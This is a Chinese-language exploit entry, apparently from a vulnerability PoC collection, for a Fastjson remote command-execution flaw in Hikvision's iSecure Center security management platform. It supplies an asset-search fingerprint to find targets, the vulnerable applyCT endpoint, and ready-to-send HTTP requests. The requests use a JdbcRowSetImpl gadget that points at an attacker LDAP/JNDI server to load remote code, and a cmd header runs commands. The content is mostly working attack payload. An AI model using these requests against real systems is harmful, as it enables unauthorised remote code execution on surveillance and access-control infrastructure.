# 海康威视iSecureCenter综合安防管理平台存在applyCTFastjson命令执行漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`POST /bic/ssoService/v1/applyCT HTTP/1.1`

**请求体 / payload**
```
poc：
Host: *
Content-Length: 5727
Content-Type: application/json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://mmmm.dns.cn","autoCommit":true},"hfe4zyyzldp":"="}

exp：\
出网情况下可利用JNDIExploit
POST /bic/ssoService/v1/applyCT HTTP/1.1
Host:
Content-Type:application/json
cmd:whoami
Content-Length: 215
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4:1389/Basic/TomcatEcho","autoCommit":true},"hfe4zyyzldp":"=…（脚本共 6500 字，完整版见原文）
```

**其他**
- 海康威视iSecure Center 综合安防管理平台存在applyCT Fastjson命令执行漏洞: * 1、漏洞描述
* 2、影响版本
* 3、资产测绘
* 4、漏洞复现
***
- 版本: HIKVISION iSecure Center综合安防管理平台\